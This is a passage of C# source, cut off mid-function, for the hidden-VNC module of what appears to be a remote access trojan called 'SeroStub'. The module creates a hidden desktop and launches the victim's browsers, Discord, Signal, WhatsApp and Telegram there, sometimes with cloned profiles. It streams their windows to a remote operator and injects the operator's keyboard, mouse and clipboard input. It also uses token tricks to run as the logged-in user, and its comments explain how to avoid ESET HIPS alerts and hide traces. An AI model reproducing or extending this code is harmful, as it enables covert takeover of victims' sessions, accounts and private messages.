using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Threading;

namespace SeroStub;

internal static class HvncFeature
{
    // ── Constants ────────────────────────────────────────────────────────────

    private const string DesktopName = "SeroHVNC";
    private const uint   DESKTOP_ALL = 0x01FF | 0x10000000; // all desktop rights + GENERIC_ALL

    private const int  SRCCOPY        = 0x00CC0020;
    private const int  PW_FULL        = 2;   // PW_RENDERFULLCONTENT
    private const uint DIB_RGB_COLORS = 0;
    private const uint BI_RGB         = 0;
    private const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;

    private const uint WM_MOUSEMOVE   = 0x0200;
    private const uint WM_LBUTTONDOWN = 0x0201;
    private const uint WM_LBUTTONUP   = 0x0202;
    private const uint WM_RBUTTONDOWN = 0x0204;
    private const uint WM_RBUTTONUP   = 0x0205;
    private const uint WM_MBUTTONDOWN = 0x0207;
    private const uint WM_MBUTTONUP   = 0x0208;
    private const uint WM_MOUSEWHEEL  = 0x020A;
    private const uint WM_KEYDOWN     = 0x0100;
    private const uint WM_KEYUP       = 0x0101;
    private const uint WM_CHAR        = 0x0102;
    private const uint WM_NCHITTEST   = 0x0084;
    private const uint WM_SYSCOMMAND    = 0x0112;
    private const uint WM_CLOSE         = 0x0010;
    private const uint WM_LBUTTONDBLCLK = 0x0203;
    private const uint MK_LBUTTON     = 0x0001;
    private const uint MK_RBUTTON     = 0x0002;
    private const uint MK_MBUTTON     = 0x0010;
    private const int  HTCLIENT       = 1;
    private const int  HTCAPTION      = 2;
    private const int  HTMINBUTTON    = 8;
    private const int  HTMAXBUTTON    = 9;
    private const int  HTCLOSE        = 20;
    private const uint SC_MINIMIZE    = 0xF020;
    private const uint SC_MAXIMIZE    = 0xF030;
    private const uint SC_RESTORE     = 0xF120;
    private const uint GA_ROOT        = 2;
    private const uint SMTO_ABORTIFHUNG = 0x0002;

    private static readonly Guid JpegClsid  = new("557CF401-1A04-11D3-9A73-0000F81EF32E");
    private static readonly Guid EncQuality = new("1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB");

    // ── P/Invoke ─────────────────────────────────────────────────────────────

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    static extern nint CreateDesktop(string lpszDesktop, nint lpszDevice, nint pDevmode,
        int dwFlags, uint dwDesiredAccess, nint lpsa);

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    static extern nint OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);

    [DllImport("user32.dll")] static extern bool   CloseDesktop(nint hDesktop);
    [DllImport("user32.dll")] static extern bool   SetThreadDesktop(nint hDesktop);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    static extern nint OpenWindowStation(string lpszWinSta, bool fInherit, uint dwDesiredAccess);
    [DllImport("user32.dll")] static extern nint   GetProcessWindowStation();
    [DllImport("user32.dll")] static extern bool   SetProcessWindowStation(nint hWinSta);
    [DllImport("user32.dll")] static extern bool   IsWindowVisible(nint hwnd);
    [DllImport("user32.dll")] static extern bool   IsIconic(nint hwnd);
    [DllImport("user32.dll")] static extern bool   GetWindowRect(nint hwnd, out RECT lpRect);
    [DllImport("user32.dll")] static extern bool   PrintWindow(nint hwnd, nint hdcBlt, uint nFlags);
    [DllImport("user32.dll")] static extern bool   PostMessage(nint hwnd, uint msg, nint wParam, nint lParam);
    [DllImport("user32.dll")] static extern nint   GetDC(nint hwnd);
    [DllImport("user32.dll")] static extern bool   ReleaseDC(nint hwnd, nint hdc);
    [DllImport("user32.dll")] static extern nint   WindowFromPoint(POINT pt);
    [DllImport("user32.dll")] static extern bool   ScreenToClient(nint hwnd, ref POINT lpPoint);
    [DllImport("user32.dll")] static extern bool   SetForegroundWindow(nint hwnd);
    [DllImport("user32.dll")] static extern nint   SetActiveWindow(nint hwnd);
    [DllImport("user32.dll")] static extern nint   SetFocus(nint hwnd);
    [DllImport("user32.dll")] static extern nint   GetForegroundWindow();
    [DllImport("user32.dll")] static extern nint   GetTopWindow(nint hwnd);
    [DllImport("user32.dll")] static extern nint   GetWindow(nint hwnd, uint uCmd);
    [DllImport("user32.dll")] static extern nint   GetAncestor(nint hwnd, uint gaFlags);
    [DllImport("user32.dll")] static extern bool   SetWindowPos(nint hwnd, nint hwndAfter, int x, int y, int cx, int cy, uint flags);
    [DllImport("user32.dll")] static extern int    GetWindowLong(nint hwnd, int nIndex);
    [DllImport("user32.dll")] static extern int    SetWindowLong(nint hwnd, int nIndex, int dwNewLong);
    [DllImport("user32.dll")] static extern bool   GetWindowPlacement(nint hwnd, ref WINDOWPLACEMENT lpwndpl);
    [DllImport("user32.dll")] static extern int    GetSystemMetrics(int nIndex);
    [DllImport("user32.dll")] static extern bool   OpenClipboard(nint hWndNewOwner);
    [DllImport("user32.dll")] static extern bool   CloseClipboard();
    [DllImport("user32.dll")] static extern bool   EmptyClipboard();
    [DllImport("user32.dll")] static extern nint   SetClipboardData(uint uFormat, nint hMem);
    [DllImport("user32.dll")]
    static extern nint SendMessageTimeout(nint hwnd, uint msg, nint wParam, nint lParam,
        uint fuFlags, uint uTimeout, out nint lpdwResult);

    [DllImport("gdi32.dll")] static extern nint CreateCompatibleDC(nint hdc);
    [DllImport("gdi32.dll")] static extern nint SelectObject(nint hdc, nint h);
    [DllImport("gdi32.dll")] static extern bool DeleteObject(nint ho);
    [DllImport("gdi32.dll")] static extern bool DeleteDC(nint hdc);
    [DllImport("gdi32.dll")]
    static extern nint CreateDIBSection(nint hdc, ref BITMAPINFO pbmi, uint usage,
        out nint ppvBits, nint hSection, uint offset);

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    static extern bool CreateProcessW(nint app, System.Text.StringBuilder cmd,
        nint pa, nint ta, bool inherit, uint flags, nint env, nint dir,
        ref STARTUPINFOW si, out PROCESS_INFORMATION pi);
    [DllImport("kernel32.dll")] static extern bool CloseHandle(nint h);
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    static extern uint ExpandEnvironmentStrings(string lpSrc, System.Text.StringBuilder lpDst, uint nSize);
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    static extern uint GetFileAttributesW(string lpFileName);
    [DllImport("kernel32.dll")] static extern nint GlobalAlloc(uint uFlags, nuint dwBytes);
    [DllImport("kernel32.dll")] static extern nint GlobalLock(nint hMem);
    [DllImport("kernel32.dll")] static extern bool GlobalUnlock(nint hMem);

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    static extern nint CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct PROCESSENTRY32W
    {
        public uint dwSize, cntUsage, th32ProcessID;
        public nint th32DefaultHeapID; public uint th32ModuleID, cntThreads, th32ParentProcessID;
        public int pcPriClassBase; public uint dwFlags;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string szExeFile;
    }
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    static extern bool Process32FirstW(nint hSnapshot, ref PROCESSENTRY32W lppe);
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    static extern bool Process32NextW(nint hSnapshot, ref PROCESSENTRY32W lppe);

    [DllImport("user32.dll")] static extern nint SendMessage(nint hwnd, uint msg, nint wParam, nint lParam);
    [DllImport("user32.dll")] static extern uint GetWindowThreadProcessId(nint hwnd, out uint lpdwProcessId);
    [DllImport("kernel32.dll")] static extern nint OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
    [DllImport("kernel32.dll")] static extern bool TerminateProcess(nint hProcess, uint uExitCode);
    [DllImport("user32.dll")]   static extern bool ShowWindow(nint hwnd, int nCmdShow);

    [DllImport("advapi32.dll")] static extern bool OpenProcessToken(nint hProcess, uint dwAccess, out nint phToken);
    [DllImport("advapi32.dll")] static extern bool DuplicateTokenEx(nint hToken, uint dwAccess, nint lpsa, int impLevel, int tokenType, out nint phNew);
    [DllImport("advapi32.dll")] static extern uint SetSecurityInfo(nint handle, uint ObjectType, uint SecurityInfo, nint psidOwner, nint psidGroup, nint pDacl, nint pSacl);
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
    static extern bool CreateProcessAsUserW(nint hToken, nint lpApp, System.Text.StringBuilder lpCmd,
        nint pa, nint ta, bool inherit, uint flags, nint lpEnv, nint dir,
        ref STARTUPINFOW si, out PROCESS_INFORMATION pi);
    // Requires only SeImpersonatePrivilege (always present in elevated admin tokens),
    // unlike CreateProcessAsUserW which requires SeAssignPrimaryTokenPrivilege (SYSTEM only).
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
    static extern bool CreateProcessWithTokenW(nint hToken, uint dwLogonFlags, nint lpApp,
        System.Text.StringBuilder lpCmd, uint flags, nint lpEnv, nint dir,
        ref STARTUPINFOW si, out PROCESS_INFORMATION pi);
    [DllImport("wtsapi32.dll")] static extern bool WTSQueryUserToken(uint sessionId, out nint phToken);
    [DllImport("kernel32.dll")] static extern uint WTSGetActiveConsoleSessionId();
    [DllImport("userenv.dll")]  static extern bool CreateEnvironmentBlock(out nint lpEnv, nint hToken, bool bInherit);
    [DllImport("userenv.dll")]  static extern bool DestroyEnvironmentBlock(nint lpEnv);

    delegate bool WndEnumProc(nint hwnd, nint lParam);
    [DllImport("user32.dll")] static extern bool EnumDesktopWindows(nint hDesktop, WndEnumProc lpfn, nint lParam);
    [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(nint hHandle, uint dwMilliseconds);
    [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(nint hProcess, nint lpBaseAddress, byte[] lpBuffer, int nSize, ref int lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")] static extern bool VirtualProtectEx(nint hProcess, nint lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)] static extern nint GetModuleHandleW(string lpModuleName);
    [DllImport("kernel32.dll")] static extern nint GetProcAddress(nint hModule, [MarshalAs(UnmanagedType.LPStr)] string lpProcName);

    [DllImport("user32.dll")] static extern bool GetGUIThreadInfo(uint idThread, ref GUITHREADINFO lpgui);
    [StructLayout(LayoutKind.Sequential)]
    struct GUITHREADINFO
    {
        public uint  cbSize;
        public uint  flags;
        public nint  hwndActive;
        public nint  hwndFocus;
        public nint  hwndCapture;
        public nint  hwndMenuOwner;
        public nint  hwndMoveSize;
        public nint  hwndCaret;
        public int   rcCaretLeft, rcCaretTop, rcCaretRight, rcCaretBottom;
    }

    [DllImport("user32.dll")] static extern uint MapVirtualKey(uint uCode, uint uMapType);
    [DllImport("user32.dll")] static extern bool SetCursorPos(int x, int y);
    [DllImport("user32.dll")] static extern nint GetParent(nint hwnd);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    static extern int GetClassName(nint hwnd, System.Text.StringBuilder lpClassName, int nMaxCount);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[]? lpKeyState, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);

    [DllImport("user32.dll")] static extern nint GetCursor();
    [DllImport("user32.dll")] static extern nint LoadCursor(nint hInstance, nint lpCursorName);
    [DllImport("user32.dll")] static extern bool DrawIconEx(nint hdc, int xLeft, int yTop, nint hIcon,
        int cxWidth, int cyWidth, uint istepIfAniCur, nint hbrFlickerFreeDraw, uint diFlags);

    [DllImport("shlwapi.dll")] static extern nint SHCreateMemStream(nint pInit, uint cbInit);
    [DllImport("gdiplus.dll")] static extern int  GdiplusStartup(out nint token, ref GdiplusInput inp, nint output);
    [DllImport("gdiplus.dll")] static extern void GdiplusShutdown(nint token);
    [DllImport("gdiplus.dll")] static extern int  GdipCreateBitmapFromScan0(int w, int h, int stride, int fmt, nint scan0, out nint bmp);
    [DllImport("gdiplus.dll")] static extern int  GdipDisposeImage(nint img);
    [DllImport("gdiplus.dll")] static extern int  GdipSaveImageToStream(nint img, nint stream, ref Guid clsid, nint encParams);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate uint VtRelease(nint pThis);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int  VtSeek(nint pThis, long move, uint origin, ref long newPos);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int  VtRead(nint pThis, nint pv, uint cb, out uint cbRead);

    // ── Structs ───────────────────────────────────────────────────────────────

    [StructLayout(LayoutKind.Sequential)]
    struct RECT { public int left, top, right, bottom; }

    [StructLayout(LayoutKind.Sequential)]
    struct POINT { public int x, y; }

    [StructLayout(LayoutKind.Sequential)]
    struct BITMAPINFOHEADER
    {
        public uint biSize; public int biWidth, biHeight;
        public ushort biPlanes, biBitCount;
        public uint biCompression, biSizeImage;
        public int biXPelsPerMeter, biYPelsPerMeter;
        public uint biClrUsed, biClrImportant;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct BITMAPINFO
    {
        public BITMAPINFOHEADER bmiHeader;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
        public uint[] bmiColors;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct GdiplusInput { public uint Version; public nint Callback; public int SuppressBackground, SuppressExternalCodecs; }
    [StructLayout(LayoutKind.Sequential)]
    struct EncoderParam  { public Guid Guid; public uint Count, Type; public nint Value; }
    [StructLayout(LayoutKind.Sequential)]
    struct EncoderParams { public uint Count; public EncoderParam Param; }
    [StructLayout(LayoutKind.Explicit, Size = 104)]
    struct STARTUPINFOW
    {
        [FieldOffset(0)]  public uint cb;
        [FieldOffset(16)] public nint lpDesktop;
        [FieldOffset(32)] public uint dwX;           // initial window X (used when STARTF_USEPOSITION set)
        [FieldOffset(36)] public uint dwY;           // initial window Y
        [FieldOffset(60)] public uint dwFlags;       // STARTF_USEPOSITION=0x4, STARTF_USESHOWWINDOW=0x1
        [FieldOffset(64)] public ushort wShowWindow; // SW_SHOWNORMAL=1 (honoured when STARTF_USESHOWWINDOW set)
    }
    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION { public nint hProcess, hThread; public uint dwProcessId, dwThreadId; }
    [StructLayout(LayoutKind.Sequential)]
    struct WINDOWPLACEMENT
    {
        public uint length, flags, showCmd;
        public POINT ptMinPosition, ptMaxPosition;
        public RECT  rcNormalPosition;
    }

    // ── Per-window DIBSection cache ───────────────────────────────────────────

    private sealed class WinCache
    {
        public nint Hdc;
        public nint Hbm;
        public nint Bits; // raw pointer into the DIBSection pixel data
        public int  W, H;
    }

    // ── State ─────────────────────────────────────────────────────────────────

    private static nint _hDesktop;
    private static nint _gdipToken;
    private static volatile bool _running;
    private static Thread? _captureThread;
    private static Func<int, string, System.Threading.Tasks.Task>? _send;
    private static readonly SemaphoreSlim _ackWake = new(0);
    private static volatile int _pendingAcks;
    private static int  _quality      = 75;
    private static int  _fpsDelay     = 50;  // 1000 / fps — used to rate-limit frames during drag
    private static int  _canvasW      = 1920;
    private static int  _canvasH      = 1080;

    // Input queue — filled by TLS receive thread, drained by capture thread (owns SetThreadDesktop)
    private static readonly ConcurrentQueue<HvncInputDataStub> _inputQueue = new();

    // Per-window capture cache (DIBSection per hwnd — reused across frames)
    private static readonly Dictionary<nint, WinCache> _winCache = new();

    // Composite DIBSection at canvas resolution
    private static nint _compHdcRef; // reference DC (physical screen)
    private static nint _compHdc;
    private static nint _compHbm;
    private static nint _compBits;  // raw pointer to composite pixels
    private static int  _compW, _compH;

    // Input state — only accessed from the capture thread
    private static int  _curX, _curY;
    private static nint _lastHwnd;
    private static bool _movingWindow;
    private static nint _movingHwnd;
    private static int  _moveOffX, _moveOffY, _moveSizeW, _moveSizeH;
    private static nint _captionFwdHwnd; // hwnd that received WM_LBUTTONDOWN on HTCAPTION mousedown (needs matching WM_LBUTTONUP)
    private static nint _lbDownHwnd;     // hwnd that received the last WM_LBUTTONDOWN — UP must go to the same widget
    private static bool _leftButtonDown; // true while LButton is held — WM_MOUSEMOVE wParam must carry MK_LBUTTON or Qt synthesizes a fake release
    private static long _lastLeftMs;
    private static int  _lastClickX, _lastClickY;
    private static bool _loggedUiaChain; // log UIItemsView parent chain once

    // Single-instance tracking: maps exe basename → PID we launched on hidden desktop
    private static readonly ConcurrentDictionary<string, uint> _launchedPids = new();

    // These apps conflict across desktops (single-instance mutex) — kill existing instance before re-launching.
    // Only kill if we previously launched them from HVNC (checked at call site via _launchedPids).
    private static readonly HashSet<string> _killBeforeLaunch = new(StringComparer.OrdinalIgnoreCase)
        { "discord.exe", "signal.exe", "whatsapp.exe" };

    // Qt apps that support -many (multiple instances) — run alongside real desktop, preserves user settings.
    private static readonly HashSet<string> _qtManyApps = new(StringComparer.OrdinalIgnoreCase)
        { "telegram.exe", "ayugram.exe" };

    // These apps support multiple windows — always launch a new instance (skip PID-alive check).
    private static readonly HashSet<string> _multiInstance = new(StringComparer.OrdinalIgnoreCase)
        { "cmd.exe", "notepad.exe" };

    // Chromium-based browsers share a profile lock — give each HVNC instance its own data dir.
    private static readonly HashSet<string> _chromiumBrowsers = new(StringComparer.OrdinalIgnoreCase)
        { "chrome.exe", "msedge.exe", "opera.exe", "operagx.exe", "brave.exe", "vivaldi.exe", "chromium.exe" };

    // Modifier key state — tracked by HandleKey, used by VkToChars
    private static bool _shiftDown, _ctrlDown, _altDown, _capsLock;

    // H264 encoder — null when unavailable (falls back to JPEG)
    private static H264Encoder? _h264Enc;


    // ── Public API ────────────────────────────────────────────────────────────

    public static void Start(HvncStartDataStub cfg, Func<int, string, System.Threading.Tasks.Task> send)
    {
        Stop();
        _send         = send;
        _quality      = Math.Clamp(cfg.Quality, 10, 95);
        _fpsDelay     = Math.Max(16, 1000 / Math.Max(1, cfg.Fps));


        // Use actual screen resolution — ignore server's requested dimensions
        int sw = GetSystemMetrics(0); // SM_CXSCREEN
        int sh = GetSystemMetrics(1); // SM_CYSCREEN
        _canvasW = sw > 0 ? sw : 1920;
        _canvasH = sh > 0 ? sh : 1080;

        // When running as SYSTEM the process lives in the non-interactive window station.
        // Switch to WinSta0 so the hidden desktop is created in the interactive station
        // and processes launched with the user token can actually find it.
        const uint WINSTA_ALL_ACCESS = 0x0000037F;
        nint hWinSta = OpenWindowStation("WinSta0", false, WINSTA_ALL_ACCESS);
        if (hWinSta != 0) SetProcessWindowStation(hWinSta);

        // Create or open hidden desktop
        _hDesktop = CreateDesktop(DesktopName, 0, 0, 0, DESKTOP_ALL, 0);
        if (_hDesktop == 0)
            _hDesktop = OpenDesktop(DesktopName, 0, false, DESKTOP_ALL);
        if (_hDesktop == 0) { StubLog.Error("[HVNC] Failed to create/open hidden desktop"); return; }
        // NULL DACL lets medium-IL processes (spawned via CreateProcessAsUserW with user token)
        // access the desktop when the stub is running elevated. SE_WINDOW_OBJECT=7, DACL_SECURITY_INFORMATION=4.
        SetSecurityInfo(_hDesktop, 7u, 4u, 0, 0, 0, 0);
        StubLog.Info($"[HVNC] Desktop 0x{_hDesktop:X}, canvas {_canvasW}x{_canvasH}");

        EnsureGdiplus();
        // Try H264 encoder — graceful fallback to JPEG if MF unavailable
        _h264Enc = H264Encoder.Create(_canvasW, _canvasH, cfg.Fps);
        Interlocked.Exchange(ref _pendingAcks, 2);
        _running = true;
        _captureThread = new Thread(CaptureLoop)
        {
            IsBackground = true, Name = "HvncCapture", Priority = ThreadPriority.Normal
        };
        _captureThread.Start();
    }

    public static void Stop()
    {
        _running = false;
        _ackWake.Release();
        while (_inputQueue.TryDequeue(out _)) { }
        _captureThread?.Join(2000);
        _captureThread = null;

        // Resources freed by CaptureLoop on exit; clean up any residual
        FreeWinCache();
        FreeComposite();
        if (_compHdcRef != 0) { ReleaseDC(0, _compHdcRef); _compHdcRef = 0; }

        if (_hDesktop != 0) { CloseDesktop(_hDesktop); _hDesktop = 0; }
        if (_gdipToken != 0) { GdiplusShutdown(_gdipToken); _gdipToken = 0; }
        _h264Enc?.Dispose(); _h264Enc = null;

        _movingWindow    = false;
        _movingHwnd      = 0;
        _captionFwdHwnd  = 0;
        _lbDownHwnd      = 0;
        _leftButtonDown  = false;
        _lastHwnd        = 0;
        _lastLeftMs      = 0;
        _lastClickX      = _lastClickY = 0;
        _shiftDown       = _ctrlDown = _altDown = _capsLock = false;
        _loggedUiaChain  = false;
        // Kill all processes launched on the hidden desktop so they don't block relaunching.
        // Browsers get a graceful WM_CLOSE first so they flush their profile to disk cleanly —
        // TerminateProcess on a browser looks like a crash to ESET HIPS, which then blocks the
        // browser's profile directory on the next real-desktop launch.
        bool launchedOpera    = _launchedPids.ContainsKey("opera.exe");
        bool launchedOperaGX  = _launchedPids.ContainsKey("operagx.exe");
        bool launchedEdge     = _launchedPids.ContainsKey("msedge.exe");
        bool launchedChrome   = _launchedPids.ContainsKey("chrome.exe");
        bool launchedBrave    = _launchedPids.ContainsKey("brave.exe");
        bool launchedVivaldi  = _launchedPids.ContainsKey("vivaldi.exe");
        bool launchedChromium = _launchedPids.ContainsKey("chromium.exe");
        bool launchedFirefox  = _launchedPids.ContainsKey("firefox.exe");
        GracefulKillBrowsers();
        // Kill each tracked process AND its entire child tree — browsers spawn renderer,
        // GPU, network-service, and utility children that TerminateProcess(parent) leaves
        // as orphans, which keep holding the profile lock until killed explicitly.
        foreach (var pid in _launchedPids.Values)
            KillProcessTree(pid);
        // Only kill Discord if we actually launched it from HVNC (tracked via update.exe or discord.exe key).
        bool launchedDiscord = _launchedPids.ContainsKey("discord.exe") || _launchedPids.ContainsKey("update.exe");
        _launchedPids.Clear();
        if (launchedDiscord) KillProcessByName("discord.exe");

        // Small pause so the OS flushes file handles before we try to delete lock files.
        Thread.Sleep(300);

        // Clean up Chromium singleton lock files + repair any corrupted JSON in HVNC profiles.
        CleanChromiumHvncLocks();

        // Repair real Opera profile: fix wrong path bug + repair corrupted JSON files.
        if (launchedOpera || launchedOperaGX) RepairOperaProfileAfterHvnc();
        if (launchedEdge)     CleanRealBrowserLock("Microsoft",    "Edge",            "User Data");
        if (launchedChrome)   CleanRealBrowserLock("Google",       "Chrome",          "User Data");
        if (launchedBrave)    CleanRealBrowserLock("BraveSoftware","Brave-Browser",   "User Data");
        if (launchedVivaldi)  CleanRealBrowserLock("Vivaldi",                         "User Data");
        if (launchedChromium) CleanRealBrowserLock("Chromium",                        "User Data");
        if (launchedFirefox)  CleanFirefoxRealLocks();
    }

    public static void SignalAck()
    {
        Interlocked.Increment(ref _pendingAcks);
        _ackWake.Release();
    }

    public static void HandleInput(string data)
    {
        if (_hDesktop == 0) return;
        var inp = JsonSerializer.Deserialize(data, SeroJson.Default.HvncInputDataStub);
        if (inp == null) return;
        _inputQueue.Enqueue(inp);
        _ackWake.Release(); // wake capture thread immediately so input isn't delayed
    }

    public static void ExecOnDesktop(string path, bool cloneBrowser = false) => LaunchOnDesktop(path, false, cloneBrowser);

    public static unsafe void SetClipboard(string text)
    {
        // Clipboard is window-station-wide — no SetThreadDesktop needed.
        // Empty string = clear only: server sends this when sync is disabled so that
        // HVNC apps cannot read the operator's clipboard via right-click → Paste.
        if (string.IsNullOrEmpty(text))
        {
            if (OpenClipboard(0)) { EmptyClipboard(); CloseClipboard(); }
            return;
        }

        if (!OpenClipboard(0)) return;
        bool ok = false;
        try
        {
            EmptyClipboard();
            int charCount = text.Length + 1;
            nint hMem = GlobalAlloc(0x0002 /*GMEM_MOVEABLE*/, (nuint)(charCount * 2));
            if (hMem == 0) return;
            nint ptr = GlobalLock(hMem);
            if (ptr != 0)
            {
                fixed (char* pSrc = text)
                    Buffer.MemoryCopy(pSrc, (void*)ptr, charCount * 2, text.Length * 2);
                *(short*)((byte*)ptr + text.Length * 2) = 0;
                GlobalUnlock(hMem);
                SetClipboardData(13 /*CF_UNICODETEXT*/, hMem);
                ok = true;
            }
        }
        finally { CloseClipboard(); }

        if (!ok || _hDesktop == 0) return;
        // Send Ctrl+V to the focused window on the hidden desktop
        const int VK_CONTROL = 0x11;
        const int VK_V       = 0x56;
        _inputQueue.Enqueue(new HvncInputDataStub { T = "kd", VK = VK_CONTROL });
        _inputQueue.Enqueue(new HvncInputDataStub { T = "kd", VK = VK_V       });
        _inputQueue.Enqueue(new HvncInputDataStub { T = "ku", VK = VK_V       });
        _inputQueue.Enqueue(new HvncInputDataStub { T = "ku", VK = VK_CONTROL });
        _ackWake.Release();
    }

    // ── Capture loop ──────────────────────────────────────────────────────────

    private static void CaptureLoop()
    {
        // Bind this OS thread to the hidden desktop for the entire session
        if (_hDesktop != 0) SetThreadDesktop(_hDesktop);

        _curX = _canvasW / 2;
        _curY = _canvasH / 2;

        // Reference DC for DIBSection creation (physical screen format)
        _compHdcRef = GetDC(0);

        StubLog.Info("[HVNC] CaptureLoop started");
        try
        {
            while (_running)
            {
                // Always drain input first — never let a pending ack block input processing.
                // This is critical for double-click timing: mouse events must be processed
                // within milliseconds, not on the next frame cycle.
                while (_inputQueue.TryDequeue(out var inp))
                    ProcessInput(inp);

                bool inDrag = _movingWindow && _movingHwnd != 0;

                if (_pendingAcks <= 0 && !inDrag)
                {
                    _ackWake.Wait(50);
                    if (!_running) break;
                    continue; // loop back to drain input before checking acks again
                }

                // During drag: bypass ack-wait to produce frames at configured FPS so the
                // user sees immediate visual feedback when moving windows. If an ack is already
                // available we consume it; otherwise we sleep one frame interval.
                if (_pendingAcks > 0)
                    Interlocked.Decrement(ref _pendingAcks);
                else // inDrag && no ack pending
                    Thread.Sleep(_fpsDelay);

                try
                {
                    if (_h264Enc != null)
                    {
                        // H264 path: capture composite, encode via MF H264 encoder
                        if (CaptureComposite() && _compBits != 0)
                        {
                            var h264 = _h264Enc.Encode(_compBits, _canvasW * 4);
                            if (h264 != null)
                            {
                                var frame = new H264FrameDataStub { W = _canvasW, H = _canvasH, D = Convert.ToBase64String(h264) };
                                _send?.Invoke((int)PacketType.HvncH264Frame,
                                    JsonSerializer.Serialize(frame, SeroJson.Default.H264FrameDataStub));
                            }
                            else { Interlocked.Increment(ref _pendingAcks); Thread.Sleep(50); }
                        }
                        else { Interlocked.Increment(ref _pendingAcks); Thread.Sleep(50); }
                    }
                    else
                    {
                        // JPEG path (fallback)
                        var jpeg = CaptureFrame();
                        if (jpeg != null)
                        {
                            var frame = new HvncFrameDataStub { W = _canvasW, H = _canvasH, J = Convert.ToBase64String(jpeg) };
                            _send?.Invoke((int)PacketType.HvncFrame,
                                JsonSerializer.Serialize(frame, SeroJson.Default.HvncFrameDataStub));
                        }
                        else { Interlocked.Increment(ref _pendingAcks); Thread.Sleep(50); }
                    }
                }
                catch { Thread.Sleep(33); }
            }
        }
        catch { }

        StubLog.Info("[HVNC] CaptureLoop stopped");
        FreeWinCache();
        FreeComposite();
        if (_compHdcRef != 0) { ReleaseDC(0, _compHdcRef); _compHdcRef = 0; }
    }

    // ── Frame capture DIBSection cache + direct pixel copy ──

    // Returns true when at least one window was drawn into _compBits (BGRA, stride = _canvasW*4).
    private static unsafe bool CaptureComposite()
    {
        int w = _canvasW, h = _canvasH;
        if (_compHdcRef == 0) return false;
        if (!EnsureComposite(w, h)) return false;

        // Clear composite to black
        new Span<byte>((void*)_compBits, w * h * 4).Clear();

        // Walk Z-order bottom-to-top: GetTopWindow→GW_HWNDLAST, then GW_HWNDPREV
        nint top  = GetTopWindow(0);
        nint walk = top != 0 ? GetWindow(top, 1 /*GW_HWNDLAST*/) : 0;

        var alive      = new HashSet<nint>();
        var toProcess  = new List<(nint hwnd, RECT r)>(32);

        for (nint cur = walk; cur != 0; cur = GetWindow(cur, 3 /*GW_HWNDPREV*/))
        {
            alive.Add(cur);
            if (!IsWindowVisible(cur) || IsIconic(cur)) continue;
            GetWindowRect(cur, out var r);
            if (r.right <= r.left || r.bottom <= r.top) continue;
            if (r.right <= 0 || r.bottom <= 0 || r.left >= w || r.top >= h) continue;
            toProcess.Add((cur, r));
        }

        // Evict cache entries for windows that no longer exist
        var stale = new List<nint>(4);
        foreach (var kv in _winCache)
            if (!alive.Contains(kv.Key)) stale.Add(kv.Key);
        foreach (var k in stale) { FreeCacheEntry(_winCache[k]); _winCache.Remove(k); }

        int drawn = 0;
        foreach (var (hwnd, r) in toProcess)
        {
            int ww = r.right  - r.left;
            int wh = r.bottom - r.top;

            var entry = GetOrCreateCache(hwnd, ww, wh);
            if (entry == null) continue;
            if (!PrintWindow(hwnd, entry.Hdc, PW_FULL)) continue;

            // Clip source/dest intersection to canvas
            int srcX = 0, srcY = 0;
            int dstX = r.left, dstY = r.top;
            int copyW = ww, copyH = wh;

            if (dstX < 0) { srcX -= dstX; copyW += dstX; dstX = 0; }
            if (dstY < 0) { srcY -= dstY; copyH += dstY; dstY = 0; }
            if (dstX + copyW > w) copyW = w - dstX;
            if (dstY + copyH > h) copyH = h - dstY;
            if (copyW <= 0 || copyH <= 0) continue;

            // Direct pixel copy: DIBSection → composite (no BitBlt overhead)
            byte* srcPx  = (byte*)entry.Bits;
            byte* dstPx  = (byte*)_compBits;
            int   srcStr = ww * 4;
            int   dstStr = w  * 4;

            for (int row = 0; row < copyH; row++)
            {
                byte* src = srcPx + (srcY + row) * srcStr + srcX * 4;
                byte* dst = dstPx + (dstY + row) * dstStr + dstX * 4;
                Buffer.MemoryCopy(src, dst, copyW * 4L, copyW * 4L);
            }
            drawn++;
        }

        if (drawn == 0) return false;

        // Draw a standard arrow cursor at the tracked position.
        // Using LoadCursor(IDC_ARROW) avoids GetCursor()/GetCursorInfo() returning
        // unexpected shapes from the capture thread context on a hidden desktop.
        nint hArrow = LoadCursor(0, (nint)32512); // IDC_ARROW = 32512
        if (hArrow != 0 && _curX >= 0 && _curY >= 0 && _curX < w && _curY < h)
